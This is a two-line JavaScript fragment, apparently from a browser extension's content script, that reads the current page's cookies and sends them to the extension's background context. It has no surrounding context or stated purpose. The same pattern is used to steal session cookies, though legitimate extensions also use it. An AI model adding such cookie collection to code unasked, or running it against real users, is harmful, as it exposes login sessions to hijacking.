const cookies = document.cookie;
chrome.runtime.sendMessage({ cookies: cookies });
